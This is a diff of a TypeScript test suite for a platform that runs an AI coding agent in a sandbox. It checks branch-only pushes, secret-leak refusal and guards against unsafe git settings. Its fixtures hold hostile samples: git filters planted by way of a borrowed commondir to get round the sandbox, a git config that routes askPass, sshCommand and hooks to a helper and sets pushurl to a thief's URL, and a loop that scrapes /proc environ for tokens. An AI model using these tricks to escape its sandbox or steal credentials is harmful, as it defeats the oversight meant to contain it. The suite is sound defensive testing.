@@ -612,40 +612,22 @@ await section("the agent asks: what a request may hold, and what becomes of an o
 	const { SecretRedactor, NO_REDACTION } = await import("../server/src/repo-secrets.js");
 	const where = { branch: "windlass/agent-asks-00aabb", base: "main" };
 
-	// What Windlass reports of a call, and what the tool's server says of it.
-	const input = JSON.stringify({ server: asks.PUBLISH_SERVER, tool: asks.PUBLISH_TOOL, arguments: { title: "T" } });
+	// The tools as they are declared to Windlass when a session is opened (its docs/acp.md, "Tools the client runs").
+	const person = asks.platformTools({ publish: true, report: false, push: true }, 10 * 60_000);
+	const item = asks.platformTools({ publish: false, report: true, push: true }, 10 * 60_000);
+	const byName = (list: typeof person) => new Map(list.map((tool) => [tool.name, tool]));
+	expect("a person's session is offered publish, push and fetch_base; an item's report, push and fetch_base, and never publish", person.map((tool) => tool.name).join() === "publish,push,fetch_base" && item.map((tool) => tool.name).join() === "report,push,fetch_base", `${person.map((tool) => tool.name)} / ${item.map((tool) => tool.name)}`);
+	expect("each is declared read, which Windlass never asks about, and each answer is the platform's own", [...person, ...item].every((tool) => tool.effect === "read" && tool.untrustedResult === false && tool.inputSchema.type === "object"));
 	expect(
-		"a call of the tool is told from any other by the engine's event",
-		asks.publishArguments("mcp_call", input)?.title === "T" &&
-			asks.publishArguments("mcp_call", JSON.stringify({ server: asks.PUBLISH_SERVER, tool: `${asks.PUBLISH_SERVER}/${asks.PUBLISH_TOOL}` })) !== null &&
-			asks.publishArguments("mcp_call", JSON.stringify({ server: "harbor", tool: asks.PUBLISH_TOOL, arguments: {} })) === null &&
-			asks.publishArguments("shell", input) === null &&
-			asks.publishArguments("mcp_call", "not json") === null,
+		"a publish may wait for the person's answer and the push (10 + 5 minutes), a push or a fetch 5 minutes, and a report Windlass's 60 s",
+		byName(person).get("publish")?.timeoutSeconds === 900 && byName(person).get("push")?.timeoutSeconds === 300 && byName(person).get("fetch_base")?.timeoutSeconds === 300 && byName(item).get("report")?.timeoutSeconds === undefined && asks.platformTools({ publish: true, report: false, push: false }, 24 * 3_600_000)[0]?.timeoutSeconds === 3600,
 	);
-	expect("the server's name for a call is read from its progress, and only a name it could have made", asks.publishRequestId("windlass_platform/publish: 0/1 handed to the platform as request 0123456789abcdef01234567") === "0123456789abcdef01234567" && asks.publishRequestId("request ../../etc/passwd") === null && asks.publishRequestId(undefined) === null);
 
-	// Windlass's configuration file in the sandbox: the server goes in beside what is there, and out again (server/src/windlass-config.ts).
+	// Windlass's configuration file in the sandbox: a server an older platform left there under its name goes, whether or not the platform's list names it (server/src/windlass-config.ts).
 	const { PLATFORM_WAKE, platformConfig } = await import("../server/src/windlass-config.js");
-	const definition = asks.publishServerDefinition(10 * 60_000);
-	const tool = [{ name: asks.PUBLISH_SERVER, definition }];
-	const held = JSON.stringify({ approval: { untrustedPaths: ["**"] }, mcp: { servers: { tracker: { command: "tracker-mcp" } } } });
-	/** `held` as the platform leaves it: with wake-ups off. */
-	const heldNow = JSON.stringify({ ...JSON.parse(held), wake: PLATFORM_WAKE });
-	const alone = platformConfig(null, null, tool);
-	const beside = platformConfig(held, null, tool);
-	expect(
-		"the tool's server is written into a configuration file that is not there, and beside what one holds",
-		alone?.config != null && Object.keys(JSON.parse(alone.config).mcp.servers).join() === asks.PUBLISH_SERVER && beside?.config != null && Object.keys(JSON.parse(beside.config).mcp.servers).join() === `tracker,${asks.PUBLISH_SERVER}` && JSON.parse(beside.config).approval.untrustedPaths[0] === "**",
-	);
-	expect("its results are marked as the platform's own, and a call may wait for the user's answer and the push", definition.untrusted === false && definition.timeoutSeconds === 900 && definition.command === "python3");
-	expect("a file that is not Windlass's configuration is left alone", platformConfig("{ not json", null, tool) === null && platformConfig("[]", null, tool) === null && platformConfig(JSON.stringify({ mcp: { servers: [] } }), null, tool) === null);
-	const emptied = platformConfig(alone?.config ?? null, alone?.written ?? null, []);
-	const restored = platformConfig(beside?.config ?? null, beside?.written ?? null, []);
-	expect(
-		"taken out again, a file that held nothing else keeps only wake-ups off, and one that held more keeps it",
-		emptied?.config != null && JSON.stringify(JSON.parse(emptied.config)) === JSON.stringify({ wake: PLATFORM_WAKE }) && emptied.written === null && emptied.changed && restored?.config != null && JSON.stringify(JSON.parse(restored.config)) === heldNow && restored.written === null && platformConfig(heldNow, null, [])?.changed === false && platformConfig("{ not json", null, []) === null,
-	);
-	expect("a server left under the tool's name by a turn that was cut off goes, whether or not the platform's list names it", platformConfig(beside?.config ?? null, null, [])?.config != null && JSON.stringify(JSON.parse(platformConfig(beside?.config ?? null, null, [])?.config as string)) === heldNow);
+	const held = { approval: { untrustedPaths: ["**"] }, mcp: { servers: { tracker: { command: "tracker-mcp" } } } };
+	const left = JSON.stringify({ ...held, mcp: { servers: { ...held.mcp.servers, [asks.PUBLISH_SERVER]: { command: "python3" } } } });
+	expect("the server an older platform left under its own name goes from Windlass's configuration", JSON.stringify(JSON.parse(platformConfig(left, null, [])?.config as string)) === JSON.stringify({ ...held, wake: PLATFORM_WAKE }));
 
 	// What a request may hold.
 	const fine = asks.publishRequest({ title: "  Fix   the\tlight ", description: "It was off.\r\n\r\nNow it is on.\u001b[31m", commit_message: undefined }, where, NO_REDACTION);
@@ -698,6 +680,327 @@ await section("the agent asks: what a request may hold, and what becomes of an o
 	expect("with nothing new to push, a new description alone is given to the pull request, and nothing is pushed", !words.opened && !words.pushed && words.retitled && own(standin.pulls.at(-1)?.body) === "Third description." && standin.branchHead(harbor, where.branch) === second.head && words.pull.pushedAt === second.pull.pushedAt);
 	const panel = await problem(() => publish.publishWork({ ...base, retitle: false, pull: words.pull, pushed: second.head, message: { title: "Other words", body: "From the panel." } }));
 	expect("a push from the panel leaves an open pull request's title and description as they are", panel?.message.startsWith("There is nothing to push") === true && standin.pulls.at(-1)?.title === "Ask to publish, again");
+});
+
+// ---------------------------------------------------------------------------------------------
+// The agent pushes its own branch (agent-publish.ts `push`, publish.ts `pushWork`)
+// ---------------------------------------------------------------------------------------------
+
+await section("the agent pushes: the session's branch only, no pull request, and over nothing but the platform's own last push", async () => {
+	const asks = await import("../server/src/agent-publish.js");
+	const { SecretRedactor, NO_REDACTION } = await import("../server/src/repo-secrets.js");
+	const branch = "windlass/agent-pushes-00ccdd";
+	const where = { branch, title: "Agent pushes" };
+
+	// What a push may hold.
+	const refused = [asks.pushRequest({ branch: "main" }, where, NO_REDACTION), asks.pushRequest({ branch: "feature/x" }, where, NO_REDACTION), asks.pushRequest({ message: ["x"] }, where, NO_REDACTION), asks.pushRequest({ message: "m".repeat(4001) }, where, NO_REDACTION)];
+	expect("a push that names another branch (the default one too), a message that is not text, or one past its limit is refused, with a sentence for the agent", refused.every((push) => !push.ok && push.told.startsWith("Not pushed. ") && push.said.endsWith("so nothing was pushed.")), refused.map((push) => (push.ok ? "accepted" : push.told.slice(12, 60))).join(" | "));
+	const named = asks.pushRequest({ branch }, where, NO_REDACTION);
+	const secret = asks.pushRequest({ message: "Use s3cr3t-push-value-0123\u001b now" }, where, new SecretRedactor([{ name: "KEY", value: "s3cr3t-push-value-0123" }]));
+	expect("the session's own branch is accepted, a push without a message is named for the session, and a message is cleaned", named.ok && named.commit === "Agent pushes" && secret.ok && secret.commit === "Use [secret:KEY] now", JSON.stringify([named, secret]));
+
+	const sandbox = localSandbox("pushes");
+	const repository = stored(harbor, adaInstallation);
+	await publish.cloneRepository(app, adaConnection, repository, sandbox);
+	const mainBefore = standin.branchHead(harbor, "main");
+	const pullsBefore = standin.pulls.length;
+	const base = { app, connection: adaConnection, repository, sandbox, sessionId: "s_agentpushes00ccdd", branch };
+	// What the session keeps, as agent-session.ts does after each push: what GitHub has, and what the platform itself pushed last (the lease).
+	let pushedHead: string | null = null;
+	let platformPushed: string | null = null;
+	const agentPush = async (message: string) => {
+		const done = await publish.pushWork({ ...base, pushed: pushedHead, lease: platformPushed }, message);
+		if (done.pushed && done.head) pushedHead = platformPushed = done.head;
+		return done;
+	};
+
+	writeFileSync(join(sandbox.cwd, "PUSHED.md"), "- one\n");
+	const first = await agentPush("First push");
+	expect("the first push pushes the session's branch with the agent's message, names the commit it pushed, and opens no pull request", first.pushed && !first.forced && first.committedFiles === 1 && first.head !== null && first.head === standin.branchHead(harbor, branch) && standin.lastCommit(harbor, branch).message === "First push" && standin.pulls.length === pullsBefore, JSON.stringify(first));
+	const again = await agentPush("Again");
+	expect("with nothing new it pushes nothing, and says so", !again.pushed && standin.branchHead(harbor, branch) === first.head);
+
+	// A pull request is open (the person published): a push rewrites its section, as at every push, and keeps the title and description.
+	const opened = await publish.publishWork({ ...base, evidence: NOTHING_VERIFIED, pull: null, pushed: pushedHead, message: { title: "The person's title", body: "The person's words." } });
+	writeFileSync(join(sandbox.cwd, "PUSHED.md"), "- one\n- two\n");
+	const second = await agentPush("Second push");
+	const described = await publish.describePull({ app, connection: adaConnection, repository, sandbox, pull: opened.pull, evidence: { ...NOTHING_VERIFIED, during: 4 } });
+	const atGithub = standin.pulls.find((pull) => pull.number === opened.pull.number);
+	expect(
+		"with a pull request open, a push of the agent's goes to its branch, the commit it names is the branch's at GitHub, and the section says the turn is still running; the title and the description stay",
+		second.pushed && second.head === standin.branchHead(harbor, branch) && pushedHead === second.head && described !== null && atGithub?.title === "The person's title" && own(atGithub.body) === "The person's words." && atGithub.body.includes("was still running") && standin.pulls.length === pullsBefore + 1,
+		atGithub?.body.slice(-300),
+	);
+
+	// The base moves on; the agent fetches it, rebases onto it, and pushes again: the platform's own last push is replaced.
+	standin.commit(harbor, "main", { "BASE.md": "moved on\n" }, "The base moves on");
+	const mainMoved = standin.branchHead(harbor, "main");
+	await publish.fetchBase(app, adaConnection, repository, sandbox, branch);
+	const rebased = await sandbox.run("git rebase --quiet origin/main && git rev-parse HEAD");
+	const third = await agentPush("unused");
+	expect(
+		"after fetch_base and a rebase, the push replaces the platform's last push, says it did, and leaves the base as it is",
+		rebased.exitCode === 0 && third.pushed && third.forced && third.committedFiles === 0 && standin.branchHead(harbor, branch) === rebased.stdout.trim() && platformPushed === third.head && standin.branchHead(harbor, "main") === mainMoved && mainMoved !== mainBefore && standin.fileOn(harbor, branch, "BASE.md") === "moved on\n",
+		`${rebased.stderr} ${JSON.stringify(third)}`,
+	);
+
+	// Someone else commits to the session's branch (a suggestion accepted on the pull request): a push that does not have it is refused, with its own sentence.
+	const theirs = standin.commit(harbor, branch, { "THEIRS.md": "someone else's\n" }, "Someone else's commit");
+	writeFileSync(join(sandbox.cwd, "PUSHED.md"), "- one\n- two\n- three\n");
+	const stale = await problem(() => agentPush("Without theirs"));
+	expect(
+		"a push that lacks a commit someone else pushed is refused, the platform's lease does not cover it, and the sentence says to fetch and merge it",
+		stale?.message.includes("has commits someone else pushed since the platform's last push") === true && stale.message.includes(`origin/${branch}`) && standin.branchHead(harbor, branch) === theirs,
+		stale?.message,
+	);
+	// fetch_base brings the session's own branch too: the agent merges it, and the push is an ordinary fast-forward.
+	await publish.fetchBase(app, adaConnection, repository, sandbox, branch);
+	const merged = await sandbox.run(`git merge --quiet --no-edit origin/${branch} && git rev-parse HEAD`);
+	const fourth = await agentPush("unused");
+	expect(
+		"after fetch_base brought the branch and the agent merged it, the push goes as a fast-forward, keeping the other person's commit",
+		merged.exitCode === 0 && fourth.pushed && !fourth.forced && standin.branchHead(harbor, branch) === fourth.head && standin.fileOn(harbor, branch, "THEIRS.md") === "someone else's\n",
+		`${merged.stderr} ${JSON.stringify(fourth)}`,
+	);
+
+	// The panel's push never forces, over the platform's own last push either.
+	await sandbox.run("git commit --quiet --amend -m 'Rewritten by the agent'");
+	const panel = await problem(() => publish.pushWork({ ...base, pushed: pushedHead }, "unused"));
+	expect("a push without the lease (the panel's) refuses a branch the workspace has rewritten", panel?.message.includes("has commits this workspace does not have") === true && standin.branchHead(harbor, branch) === fourth.head, panel?.message);
+
+	// A sandbox replaced after someone else pushed: the clone takes in their commit as what GitHub has, but the lease stays the platform's own push.
+	const after = standin.commit(harbor, branch, { "AFTER.md": "pushed after the platform\n" }, "Someone else, again");
+	const replaced = localSandbox("pushes-replaced");
+	const cloned = await publish.cloneRepository(app, adaConnection, repository, replaced, undefined, branch);
+	const headThere = cloned !== false ? cloned.work : null;
+	// What the session does then (agent-session.ts putWorkspaceOnWork): what GitHub has is the new tip; the lease is untouched.
+	pushedHead = headThere;
+	await replaced.run("git reset --quiet --hard HEAD~1 && echo dropped > DROPPED.md && git add -A && git commit --quiet -m 'Drops their commit'");
+	const dropped = await problem(() => publish.pushWork({ ...base, sandbox: replaced, pushed: pushedHead, lease: platformPushed }, "unused"));
+	expect(
+		"in a replaced sandbox, a rewritten branch cannot push away a commit someone else pushed: the lease is the platform's own last push, not what the clone found",
+		headThere === after && platformPushed === fourth.head && dropped?.message.includes("has commits someone else pushed") === true && standin.branchHead(harbor, branch) === after,
+		dropped?.message,
+	);
+	expect("the default branch was never touched by any of it", standin.branchHead(harbor, "main") === mainMoved);
+});
+
+await section("a push that would send a saved secret's value is refused, and the platform's own commit is undone", async () => {
+	const { SecretRedactor } = await import("../server/src/repo-secrets.js");
+	const redactor = new SecretRedactor([{ name: "NPM_TOKEN", value: "npm_s3cr3t_value_000111" }]);
+	const sandbox = localSandbox("leak");
+	const repository = stored(harbor, adaInstallation);
+	await publish.cloneRepository(app, adaConnection, repository, sandbox);
+	const branch = "windlass/leak-00aa11";
+	const base = { app, connection: adaConnection, repository, sandbox, sessionId: "s_leak00000000aa11", branch, pushed: null, lease: null, redact: (text: string) => redactor.text(text) };
+	// What a setup command may leave behind: a file with the token in it, beside the agent's work.
+	writeFileSync(join(sandbox.cwd, ".npmrc"), "//registry.npmjs.org/:_authToken=npm_s3cr3t_value_000111\n");
+	writeFileSync(join(sandbox.cwd, "WORK.md"), "the agent's work\n");
+	const headBefore = (await sandbox.run("git rev-parse HEAD")).stdout.trim();
+	const refused = await problem(() => publish.pushWork(base, "Work with a leak"));
+	const after = await sandbox.run("git rev-parse HEAD; git status --porcelain");
+	expect(
+		"the push is refused naming the file and the secret, nothing reaches GitHub, and the platform's commit is undone with the change kept",
+		refused?.message.startsWith("Nothing was pushed: .npmrc would have gone to GitHub with the value of the secret NPM_TOKEN") === true && standin.branchHead(harbor, branch) === null && after.stdout.startsWith(`${headBefore}\n`) && after.stdout.includes(".npmrc") && after.stdout.includes("WORK.md"),
+		`${refused?.message} | ${after.stdout.replace(/\n/g, " ")}`,
+	);
+	// A commit of the agent's own that added the value and a later one that removed it: the history would still send it.
+	await sandbox.run("git add -A && git commit --quiet -m 'Adds the leak' && git rm --quiet --cached .npmrc && rm .npmrc && git commit --quiet -m 'Removes it'");
+	const history = await problem(() => publish.pushWork(base, "unused"));
+	expect("a value added by one commit and removed by a later one is refused all the same: the commits sent hold it", history?.message.includes(".npmrc") === true && standin.branchHead(harbor, branch) === null, history?.message);
+	await sandbox.run("git reset --quiet --hard HEAD~2 && echo clean > CLEAN.md");
+	const clean = await publish.pushWork(base, "Clean work");
+	expect("without the value, the push goes", clean.pushed && standin.branchHead(harbor, branch) === clean.head, JSON.stringify(clean));
+});
+
+await section("nested repositories are refused before turn-end diff, panel probe or commit", async () => {
+	const { DIFF_COMMAND } = await import("../server/src/actors/agent-session.js");
+	const sandbox = localSandbox("nested");
+	const repository = stored(harbor, adaInstallation);
+	await publish.cloneRepository(app, adaConnection, repository, sandbox);
+	const inner = "packages/example/inner";
+	await sandbox.run(`mkdir -p ${inner} && git init -q ${inner} && git -C ${inner} commit -q --allow-empty -m inner`);
+	const input = { sessionId: "guard-nested", branch: "main", base: "main", pushed: null, author: { name: "Fixture", email: "fixture@example.invalid" } };
+	for (const state of ["untracked", "indexed", "unpopulated"]) {
+		if (state === "indexed") await sandbox.run(`git add -- ${inner}`);
+		if (state === "unpopulated") await sandbox.run(`mv ${inner} ../saved-inner`);
+		const why = state === "untracked" ? "nested" : "gitlink";
+		// Each sentinel is reached only if the generated command passes its guard and returns successfully.
+		for (const [name, command] of [["turn-end diff", DIFF_COMMAND], ["panel probe", gitSteps.probeScript("main", null)], ["commit", gitSteps.commitScript(input)]]) {
+			const marker = join(sandbox.home, `completed-${state}-${name}`);
+			const result = await sandbox.run(`${command}\ntouch "$HOME/completed-${state}-${name}"`, { stdin: "Fixture\n" });
+			expect(`${state}: ${name} refused before completing`, result.exitCode === 3 && gitSteps.markers(result.stdout).get("unsafe") === why && !existsSync(marker));
+		}
+	}
+});
+
+await section("husky configuration works for the session and the platform push", async () => {
+	const { STATUS_COMMAND, DIFF_COMMAND } = await import("../server/src/actors/agent-session.js");
+	const sandbox = localSandbox("husky");
+	const repository = stored(harbor, adaInstallation);
+	await publish.cloneRepository(app, adaConnection, repository, sandbox);
+	const setup = await sandbox.run("mkdir -p .husky/_ && git config core.hooksPath .husky/_ && git config core.fsmonitor .husky/_/monitor");
+	const marker = join(sandbox.home, "hook-ran");
+	for (const hook of ["pre-commit", "post-commit", "post-checkout", "pre-push", "monitor"]) {
+		const path = join(sandbox.cwd, ".husky/_", hook);
+		writeFileSync(path, '#!/bin/sh\ntouch "$HOME/hook-ran"\nexit 1\n');
+		chmodSync(path, 0o755);
+	}
+	writeFileSync(join(sandbox.cwd, "work.txt"), "changed\n");
+	const status = await sandbox.run(STATUS_COMMAND);
+	const diff = await sandbox.run(DIFF_COMMAND);
+	const dirty = await publish.hasUnpushedWork(sandbox, "main", null);
+	const branch = "windlass/husky-000001";
+	const input = { app, connection: adaConnection, repository, sandbox, sessionId: "guard-husky", branch, pushed: null };
+	const err = await problem(() => publish.pushWork(input, "Husky work"));
+	expect("husky status, diff, panel probe and push succeed without invoking any hook", setup.exitCode === 0 && status.stdout.includes("work.txt") && diff.stdout.includes("+changed") && dirty === true && err === null && standin.fileOn(harbor, branch, "work.txt") === "changed\n" && !existsSync(marker));
+	await sandbox.run("git config filter.lfs.required true");
+	const probe = await gitSteps.probeWork(sandbox, "main", null);
+	expect("a local LFS filter is still refused", !probe.ok && probe.marks.get("unsafe") === "filter.lfs.required");
+});
+
+await section("outgoing history is checked before the push transport", async () => {
+	const repository = stored(harbor, adaInstallation);
+	const value = "history-check-fixture";
+	for (const kind of ["merge", "binary", "message", "large", "buffered", "base"]) {
+		const sandbox = localSandbox(`history-${kind}`);
+		await publish.cloneRepository(app, adaConnection, repository, sandbox);
+		const branch = `windlass/history-${kind}`;
+		const prepare = async (cmd: string) => {
+			if ((await sandbox.run(cmd)).exitCode !== 0) throw new Error(`could not prepare ${kind} history`);
+		};
+		await prepare(`git switch -qc ${branch}`);
+		if (kind === "merge") {
+			await prepare("git switch -qc side && git commit --allow-empty -qm side && git switch -q - && git merge --no-ff --no-commit side");
+			writeFileSync(join(sandbox.cwd, ".env"), value);
+		} else if (kind === "binary") {
+			writeFileSync(join(sandbox.cwd, "fixture.bin"), Buffer.from(`a\0${value}`));
+		} else if (kind === "message") {
+			await prepare(`git commit --allow-empty -qm ${value}`);
+		} else if (kind === "base") {
+			// A stale workspace tracking ref must not determine which commits were seen by the platform.
+			writeFileSync(join(sandbox.cwd, "fixture.txt"), value);
+			await prepare("git add fixture.txt && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD");
+		} else {
+			writeFileSync(join(sandbox.cwd, "fixture.txt"), "a".repeat(kind === "large" ? 8_000_000 : 5_000_000) + (kind === "buffered" ? value : ""));
+		}
+		// Model the providers' buffered stdout cap. No push transport is allowed in these refusal cases.
+		let transport = false;
+		const localRun = sandbox.run.bind(sandbox);
+		sandbox.run = async (command, options) => {
+			if (command.includes("push --porcelain")) {
+				transport = true;
+				return { exitCode: 1, stdout: "", stderr: "", timedOut: false, aborted: false };
+			}
+			const result = await localRun(command, options);
+			options?.onStdout?.(result.stdout);
+			return { ...result, stdout: result.stdout.slice(0, 4 * 1024 * 1024) };
+		};
+		const input = { app, connection: adaConnection, repository, sandbox, branch, sessionId: `guard-history-${kind}`, pushed: null, redact: (text: string) => text.replaceAll(value, "[secret:FIXTURE]") };
+		const refused = await problem(() => publish.pushWork(input, "Fixture"));
+		expect(`${kind}: refusal before the transport`, refused?.message.includes(kind === "large" ? "too large to check for saved secrets" : "the secret FIXTURE") === true && !transport && standin.branchHead(harbor, branch) === null);
+	}
+});
+
+await section("an up-to-date branch never yields a platform push receipt", async () => {
+	const { recordPushHead } = await import("../server/src/actors/agent-session.js");
+	const meta = { platformPushed: null as string | null, pushedHead: null as string | null };
+	const sandbox = localSandbox("lease-noop");
+	const repository = stored(harbor, adaInstallation);
+	await publish.cloneRepository(app, adaConnection, repository, sandbox);
+	const branch = "windlass/lease-noop";
+	const base = { app, connection: adaConnection, repository, sandbox, branch, sessionId: "guard-lease", pushed: null };
+	writeFileSync(join(sandbox.cwd, "work.txt"), "work\n");
+	const first = await publish.pushWork(base, "Platform work");
+	expect("the initial transfer yields its receipt", first.head !== null && recordPushHead(meta, sandbox, first.head) && meta.platformPushed === first.head);
+	const other = standin.commit(harbor, branch, { "other.txt": "other\n" }, "Someone else's work");
+	await publish.fetchBase(app, adaConnection, repository, sandbox, branch);
+	const ff = await sandbox.run(`git merge --ff-only origin/${branch}`);
+	const noop = await publish.pushWork({ ...base, pushed: first.head, lease: first.head }, "Nothing new");
+	expect("observing the other person's commit at the remote yields no lease on it", ff.exitCode === 0 && noop.head === other && !recordPushHead(meta, sandbox, other) && meta.pushedHead === other && meta.platformPushed === first.head && standin.branchHead(harbor, branch) === other);
+	standin.appPermissions = { metadata: "read", contents: "write" };
+	try {
+		await publish.publishWork({ ...base, pushed: other, pull: null, message: { title: "Open it", body: "" }, evidence: NOTHING_VERIFIED });
+		expect("PR step refused after a no-op", false);
+	} catch (error) {
+		expect("a failed PR after a no-op still yields no lease on the observed head", error instanceof publish.PullProblem && error.head === other && !recordPushHead(meta, sandbox, other) && meta.pushedHead === other && meta.platformPushed === first.head);
+	} finally {
+		standin.appPermissions = { metadata: "read", contents: "write", pull_requests: "write" };
+	}
+});
+
+await section("a workspace whose git would start a program of the agent's is refused before any git of the platform's runs", async () => {
+	const { WORKSPACE_GIT_START, readWork } = await import("../server/src/github/git.js");
+	const repository = stored(harbor, adaInstallation);
+	const variants: Array<{ name: string; plant: (cwd: string, marker: string) => string }> = [
+		{
+			// Inside bubblewrap a command may not write .git/config, but it can make .git borrow another configuration.
+			name: "a commondir whose configuration defines a filter",
+			plant: (cwd, marker) => {
+				const other = join(cwd, "..", "borrowed");
+				execFileSync("cp", ["-r", join(cwd, ".git"), other]);
+				writeFileSync(join(other, "config"), `${readFileSync(join(other, "config"), "utf8")}[filter "x"]\n\tclean = sh -c 'touch ${marker}; cat'\n\tsmudge = sh -c 'touch ${marker}; cat'\n`);
+				writeFileSync(join(cwd, ".git/commondir"), `${other}\n`);
+				return "* filter=x\n";
+			},
+		},
+		{
+			// Or put the repository aside and make one of its own.
+			name: "a .git moved aside and made again, with a filter",
+			plant: (cwd, marker) => {
+				execFileSync("mv", [join(cwd, ".git"), join(cwd, ".gitold")]);
+				execFileSync("git", ["init", "--quiet", "."], { cwd });
+				execFileSync("git", ["config", `filter.x.clean`, `sh -c 'touch ${marker}; cat'`], { cwd });
+				return "* filter=x\n";
+			},
+		},
+	];
+	for (const variant of variants) {
+		const sandbox = localSandbox("unsafe");
+		await publish.cloneRepository(app, adaConnection, repository, sandbox);
+		const marker = join(scratch, `marker-${randomBytes(4).toString("hex")}`);
+		writeFileSync(join(sandbox.cwd, ".gitattributes"), variant.plant(sandbox.cwd, marker));
+		writeFileSync(join(sandbox.cwd, "CHANGED.md"), "changed\n");
+		const branch = `windlass/unsafe-${randomBytes(3).toString("hex")}`;
+		const before = standin.branchHead(harbor, branch);
+		const push = await problem(() => publish.pushWork({ app, connection: adaConnection, repository, sandbox, sessionId: "s_unsafe00000000", branch, pushed: null, lease: null }, "Try"));
+		const probe = await publish.hasUnpushedWork(sandbox, "main", null);
+		const read = await readWork(sandbox, "main");
+		const status = await sandbox.run(`${WORKSPACE_GIT_START}\ngit --no-optional-locks status --porcelain=v1`);
+		expect(
+			`${variant.name}: the push, the probe, the read and the session's status are refused, nothing is pushed, and no program of the workspace's ran`,
+			push?.message.startsWith("The workspace's git settings were changed in a way the platform does not run") === true && probe === null && read === null && status.exitCode === 3 && status.stdout.startsWith("wlp:unsafe") && standin.branchHead(harbor, branch) === before && !existsSync(marker),
+			`${push?.message.slice(0, 90)} | probe ${probe} | status ${status.exitCode} ${status.stdout.trim()} | marker ${existsSync(marker)}`,
+		);
+	}
+});
+
+await section("an item's step after its agent pushed everything: the open pull request is described again, not refused", async () => {
+	const sandbox = localSandbox("shown");
+	const repository = stored(harbor, adaInstallation);
+	await publish.cloneRepository(app, adaConnection, repository, sandbox);
+	const branch = "windlass/item-shown-00eeff";
+	const base = { app, connection: adaConnection, repository, sandbox, sessionId: "s_itemshown00eeff", branch, evidence: NOTHING_VERIFIED };
+	writeFileSync(join(sandbox.cwd, "ITEM.md"), "- one\n");
+	const opened = await publish.publishWork({ ...base, pull: null, pushed: null, message: { title: "The item", body: "Round one." } });
+	writeFileSync(join(sandbox.cwd, "ITEM.md"), "- one\n- two\n");
+	const pushed = await publish.pushWork({ ...base, pushed: opened.head, lease: opened.head }, "The fix of round two");
+	const refused = await problem(() => publish.publishWork({ ...base, pull: opened.pull, pushed: pushed.head, message: { title: "unused", body: "" } }));
+	const shown = await publish.publishWork({ ...base, pull: opened.pull, pushed: pushed.head, shownIsEnough: true, message: { title: "unused", body: "" } });
+	expect("from the panel, nothing to push is still refused", refused?.message.startsWith("There is nothing to push") === true, refused?.message);
+	expect("for the item, it answers with the pull request: nothing pushed, nothing opened, the title kept", !shown.pushed && !shown.opened && shown.pull.number === opened.pull.number && shown.pull.title === "The item" && standin.branchHead(harbor, branch) === pushed.head, JSON.stringify(shown));
+
+	// The agent rebased onto a moved base and did not push: the item's step pushes over the platform's own last push, as the agent's push would.
+	standin.commit(harbor, "main", { "ITEM_BASE.md": "the base moved\n" }, "The base moves for the item");
+	await publish.fetchBase(app, adaConnection, repository, sandbox);
+	const rebased = await sandbox.run("git rebase --quiet origin/main && git rev-parse HEAD");
+	const fromPanel = await problem(() => publish.publishWork({ ...base, pull: opened.pull, pushed: pushed.head, message: { title: "unused", body: "" } }));
+	const fromItem = await publish.publishWork({ ...base, pull: opened.pull, pushed: pushed.head, lease: pushed.head, shownIsEnough: true, message: { title: "unused", body: "" } });
+	expect(
+		"after the agent rebased without pushing, the panel's push is refused, and the item's step, under the lease, replaces the platform's last push and keeps the pull request",
+		rebased.exitCode === 0 && fromPanel?.message.includes("has commits this workspace does not have") === true && fromItem.pushed && fromItem.pull.number === opened.pull.number && standin.branchHead(harbor, branch) === rebased.stdout.trim(),
+		`${fromPanel?.message.slice(0, 80)} | ${JSON.stringify({ pushed: fromItem.pushed, head: fromItem.head })}`,
+	);
 });
 
 // ---------------------------------------------------------------------------------------------
@@ -838,7 +1141,8 @@ await section("hostile: a workspace set up to catch the token catches nothing", 
 		`[core]\n\thooksPath = ${join(sandbox.cwd, ".git/hooks")}\n\tfsmonitor = ${helper}\n\taskPass = ${helper}\n\tsshCommand = ${helper}`,
 		`[remote "origin"]\n\tpushurl = ${thiefUrl}/ada/harbor.git`,
 	].join("\n");
-	writeFileSync(join(sandbox.cwd, ".git/config"), `${readFileSync(join(sandbox.cwd, ".git/config"), "utf8")}\n${hostile}\n`);
+	const ownConfig = readFileSync(join(sandbox.cwd, ".git/config"), "utf8");
+	writeFileSync(join(sandbox.cwd, ".git/config"), `${ownConfig}\n${hostile}\n`);
 	writeFileSync(join(sandbox.home, ".gitconfig"), `${readFileSync(join(sandbox.home, ".gitconfig"), "utf8")}\n${hostile}\n`);
 	// Programs of the agent's own before the system's in PATH, each of which keeps what it is given.
 	const bin = join(sandbox.home, "bin");
@@ -852,8 +1156,18 @@ await section("hostile: a workspace set up to catch the token catches nothing", 
 	const watcher: ChildProcess = spawn("bash", ["-c", `while :; do for pid in /proc/[0-9]*; do { tr '\\0' '\\n' < $pid/environ; tr '\\0' ' ' < $pid/cmdline; } 2>/dev/null; done >> ${loot}/watcher; done`], { stdio: "ignore" });
 
 	writeFileSync(join(sandbox.cwd, "work.txt"), "hostile\n");
-	const from = standin.minted.length;
 	const branch = "windlass/hostile-000000";
+	// With all of it in the workspace's own configuration, the platform's git does not run there at all (git.ts `wlp_guard`).
+	const refusedFrom = standin.minted.length;
+	const refusedHostile = await problem(() => publish.publishWork({ evidence: NOTHING_VERIFIED, app, connection: adaConnection, repository, sandbox, sessionId: "s_hostile", branch, pull: null, pushed: null, message: { title: "Pushed from a hostile workspace", body: "" } }));
+	expect(
+		"with the workspace's own configuration hostile, the publish is refused before any git of the platform's runs: no push token is asked for, the other server is not asked",
+		refusedHostile?.message.startsWith("The workspace's git settings were changed in a way the platform does not run") === true && !mintedSince(refusedFrom).some((entry) => entry.includes("contents:write")) && caught.length === 0 && standin.branchHead(harbor, branch) === null,
+		refusedHostile?.message.slice(0, 160),
+	);
+	// The home directory's configuration stays hostile: the platform's git reads none but the repository's own.
+	writeFileSync(join(sandbox.cwd, ".git/config"), ownConfig);
+	const from = standin.minted.length;
 	let outcome: Awaited<ReturnType<typeof publish.publishWork>> | null = null;
 	try {
 		outcome = await publish.publishWork({ evidence: NOTHING_VERIFIED, app, connection: adaConnection, repository, sandbox, sessionId: "s_hostile", branch, pull: null, pushed: null, message: { title: "Pushed from a hostile workspace", body: "" } });
@@ -869,7 +1183,8 @@ await section("hostile: a workspace set up to catch the token catches nothing", 
 	const holding = filesHolding(loot, pushToken).concat(tokens.flatMap((token) => filesHolding(loot, token)));
 	const encoded = Buffer.from(`x-access-token:${pushToken}`, "utf8").toString("base64");
